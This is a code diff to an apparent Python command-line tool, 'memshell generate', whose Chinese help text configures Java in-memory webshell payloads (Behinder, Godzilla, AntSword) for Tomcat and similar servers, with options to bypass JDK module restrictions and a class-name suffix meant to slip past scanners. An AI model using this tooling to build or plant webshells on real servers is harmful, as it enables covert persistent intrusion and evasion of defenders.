@@ -32,54 +32,27 @@ except ImportError:  # pragma: no cover
     RequestException = OSError  # type: ignore[misc, assignment]
 
 _GENERATE_EPILOG = """
-参数说明（对齐 MemShellParty 官方字段）：
+常用参数（server / shell-tool / shell-type 在已知名称内不区分大小写）：
 
-  shellConfig
-    --server                目标中间件/框架（Tomcat、Jetty、SpringWebMvc…）
-    --server-version        服务版本；少数挂载类型因包名差异才需要（默认 unknown）
-    --shell-tool            内存马工具类型（Behinder/Godzilla/Command/AntSword/Suo5…）
-    --shell-type            挂载形态（Listener/Filter/Valve/Servlet/Agent…）
-    --target-jre-version    目标字节码 class 主版本：50=Java6,52=8,53=9,55=11,61=17,65=21
-    --debug                 调试：注入器打印注入信息，Shell 打印异常堆栈
-    --by-pass-java-module / --no-by-pass-java-module
-                            绕过 JDK9+ 模块系统（注入 Unsafe defineClass）；未指定且 JRE>=53 时自动 True
-    --no-shrink             关闭缩小字节码（默认开启 ASM SKIP_DEBUG 去掉调试信息）
-    --probe                 回显探测模式：把注入器塞进回显马，便于非本地确认注入（默认关）
-    --lambda-suffix         类名追加 $Proxy0$$Lambda$1 后缀，便于绕过部分扫描（默认关）
+  --server / --shell-tool / --shell-type   中间件、工具、挂载类型（默认 Tomcat / Behinder / Listener）
+  --jre                                   目标 Java 发行版本：6/8/9/11/17/21（默认 6；JDK9+ 用 ≥9）
+  --password / --key                      通用密码；哥斯拉再加 --key
+  --header-name / --header-value          入口特征请求头（默认名 User-Agent）
+  --packer / --url-pattern                打包格式与挂载路径
+  -o/--output                             仅写 packResult；stdout 打印 meta JSON
 
-  injectorConfig
-    --url-pattern           挂载/匹配的 URL（默认 /*；Servlet/Controller 等需具体路径）
-    --injector-class-name   注入器全限定类名（空则服务端随机）
-    --no-static-initialize  关闭静态块调构造（默认开，适配 Class.forName(...,true,...) sink）
-
-  shellToolConfig
-    --password              通用连接密码：按 --shell-tool 自动写入 behinderPass/godzillaPass/antSwordPass
-    --key                   哥斯拉密钥 godzillaKey（建议与 Godzilla + --password 一起用）
-    --shell-class-name      Shell 全限定类名（空则随机）
-    --behinder-pass         冰蝎密码（优先于 --password；空则服务端随机）
-    --godzilla-pass/--godzilla-key  哥斯拉密码/密钥（优先于 --password/--key）
-    --ant-sword-pass        蚁剑密码（优先于 --password）
-    --header-name/--header-value    入口特征请求头名/值（匹配后才进马逻辑；值空则随机）
-    --command-param-name    Command 马：命令参数名或头名
-    --command-template      Command 马：执行模板，{command} 占位
-    --encryptor             Command：RAW|BASE64|DOUBLE_BASE64（默认 RAW）
-    --implementation-class  Command：RuntimeExec|ForkAndExec（默认 RuntimeExec）
-    --shell-class-base64    Custom 模式：自定义 .class 的 Base64
-
-  packer
-    --packer                打包格式（DefaultBase64、ClassLoaderJSP、SpELScriptEngine…）
-
-  其它
-    -o/--output             仅将 packResult 写入文件；stdout 打印连接 meta JSON
-    --body FILE             官方 JSON 请求体，与 flag 深度合并（body 覆盖）
-    --body-only             忽略 CLI flag，仅用 --body + 库默认
-    --base-url              服务根地址（默认 https://party.mem.mk）
+其它（可选）：
+  --by-pass-java-module / --no-by-pass-java-module / --no-shrink / --no-static-initialize
+  --server-version / --debug / --probe / --lambda-suffix
+  --shell-class-name / --injector-class-name
+  --command-param-name / --command-template / --encryptor / --implementation-class
+  --shell-class-base64 / --body / --body-only / --base-url
 
 示例：
   memshell generate -o payload.txt
   memshell generate --password mypass --header-value secret -o out.txt
-  memshell generate --shell-tool Godzilla --password p --key k -o out.txt
-  memshell generate --shell-tool Godzilla --shell-type Filter --target-jre-version 53 -o out.txt
+  memshell generate --shell-tool godzilla --password p --key k -o out.txt
+  memshell generate --server tomcat --shell-type filter --jre 9 -o out.txt
   memshell generate --help
 """
 
@@ -142,7 +115,6 @@ def _cmd_generate(args: argparse.Namespace) -> int:
         "server_version": args.server_version,
         "shell_tool": args.shell_tool,
         "shell_type": args.shell_type,
-        "target_jre_version": args.target_jre_version,
         "debug": args.debug,
         "by_pass_java_module": args.by_pass_java_module,
         "shrink": not args.no_shrink,
@@ -167,6 +139,10 @@ def _cmd_generate(args: argparse.Namespace) -> int:
         "shell_class_base64": args.shell_class_base64,
         "injector_class_name": args.injector_class_name,
     }
+    if getattr(args, "jre", None) is not None:
+        kwargs["jre"] = args.jre
+    elif getattr(args, "target_jre_version", None) is not None:
+        kwargs["target_jre_version"] = args.target_jre_version
 
     if body_override is not None and args.body_only:
         gen_kwargs: dict = {}
@@ -309,7 +285,7 @@ def main(argv: list[str] | None = None) -> int:
     p_gen.add_argument(
         "--server",
         default="Tomcat",
-        help="目标中间件/框架，如 Tomcat、Jetty、SpringWebMvc（默认 Tomcat）",
+        help="目标中间件/框架（不区分大小写）：Tomcat、Jetty、SpringWebMvc…（默认 Tomcat）",
     )
     p_gen.add_argument(
         "--server-version",
@@ -319,17 +295,22 @@ def main(argv: list[str] | None = None) -> int:
     p_gen.add_argument(
         "--shell-tool",
         default="Behinder",
-        help="内存马工具：Behinder/Godzilla/Command/AntSword/Suo5/Suo5v2/NeoreGeorg/Proxy/Custom（默认 Behinder）",
+        help="内存马工具（不区分大小写）：Behinder/Godzilla/Command/AntSword…（默认 Behinder）",
     )
     p_gen.add_argument(
         "--shell-type",
         default="Listener",
-        help="挂载类型：Listener/Filter/Valve/Servlet/Agent…（须与 server+shellTool 匹配，默认 Listener）",
+        help="挂载类型（不区分大小写）：Listener/Filter/Valve…（须与 server+tool 匹配，默认 Listener）",
+    )
+    p_gen.add_argument(
+        "--jre",
+        default=None,
+        help="目标 Java/JRE 发行版本：6/8/9/11/17/21（推荐；默认 6）",
     )
     p_gen.add_argument(
         "--target-jre-version",
-        default="50",
-        help="目标 JRE class 主版本：50=Java6,52=8,53=9,55=11,61=17,65=21（默认 50）",
+        default=None,
+        help=argparse.SUPPRESS,
     )
     p_gen.add_argument(
         "--debug",
@@ -341,7 +322,7 @@ def main(argv: list[str] | None = None) -> int:
         dest="by_pass_java_module",
         action=argparse.BooleanOptionalAction,
         default=None,
-        help="绕过 JDK9+ 模块限制（Unsafe defineClass）；未指定时 JRE>=53 自动 True",
+        help="绕过 JDK9+ 模块限制（Unsafe defineClass）；未指定时 JRE≥9 自动 True",
     )
     p_gen.add_argument(
         "--no-shrink",
@@ -378,17 +359,17 @@ def main(argv: list[str] | None = None) -> int:
         "--password",
         dest="password",
         default="",
-        help="通用连接密码：按 --shell-tool 自动映射到冰蝎/哥斯拉/蚁剑对应 *Pass（专用 --*-pass 优先）",
+        help="通用连接密码：按 --shell-tool 自动映射到冰蝎/哥斯拉/蚁剑对应 *Pass",
     )
     p_gen.add_argument(
         "--key",
         default="",
-        help="哥斯拉密钥 godzillaKey（专用 --godzilla-key 优先）；其它工具通常不需要",
+        help="哥斯拉密钥 godzillaKey（建议与 Godzilla + --password 一起用）",
     )
-    p_gen.add_argument("--godzilla-pass", default="", help="哥斯拉密码（优先于 --password；空则服务端随机）")
-    p_gen.add_argument("--godzilla-key", default="", help="哥斯拉密钥（优先于 --key；空则服务端随机）")
-    p_gen.add_argument("--behinder-pass", default="", help="冰蝎密码（优先于 --password；空则服务端随机）")
-    p_gen.add_argument("--ant-sword-pass", default="", help="蚁剑密码（优先于 --password；空则服务端随机）")
+    p_gen.add_argument("--godzilla-pass", default="", help=argparse.SUPPRESS)
+    p_gen.add_argument("--godzilla-key", default="", help=argparse.SUPPRESS)
+    p_gen.add_argument("--behinder-pass", default="", help=argparse.SUPPRESS)
+    p_gen.add_argument("--ant-sword-pass", default="", help=argparse.SUPPRESS)
     p_gen.add_argument(
         "--command-param-name",
         default="",
